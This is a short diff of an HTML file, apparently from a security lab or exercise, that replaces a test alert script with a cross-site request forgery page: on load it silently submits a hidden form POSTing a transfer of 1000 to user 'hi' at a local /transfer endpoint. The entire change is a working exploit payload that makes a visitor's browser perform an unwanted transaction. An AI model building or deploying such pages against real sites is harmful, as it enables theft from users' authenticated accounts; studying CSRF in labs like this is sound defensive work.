@@ -1,3 +1,8 @@
 <html> 
-     <script>alert("sup");</script>
+    <body onload="document.forms[0].submit();">
+        <form action="http://192.168.2.98:49698/transfer" method="POST">
+            <input type="text" class="form-control" id="inputTo" name="user_to" placeholder="Who do you want to transfer to?" value="hi">
+            <input type="number" class="form-control" id="inputAmount" name="amount" placeholder="Amount to transfer" value="1000">
+        </form>
+    </body>
 </html>
